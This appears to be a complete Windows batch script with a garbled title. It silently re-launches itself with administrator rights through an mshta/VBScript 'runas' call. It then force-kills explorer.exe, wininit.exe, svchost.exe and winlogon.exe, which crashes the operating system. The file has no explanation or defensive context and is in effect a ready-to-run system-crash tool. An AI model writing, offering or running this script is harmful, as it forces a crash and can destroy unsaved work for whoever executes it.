@echo off
setlocal EnableDelayedExpansion & cd /d "%~dp0"
title ю╤фа
color 1f
%1 %2
mshta vbscript:createobject("shell.application").shellexecute("%~s0","goto :start","","runas",1)(window.close)&goto :eof
:start
taskkill /im explorer.exe /f
taskkill /im wininit.exe /f
taskkill /im svchost.exe /f
taskkill /im winlogon.exe /f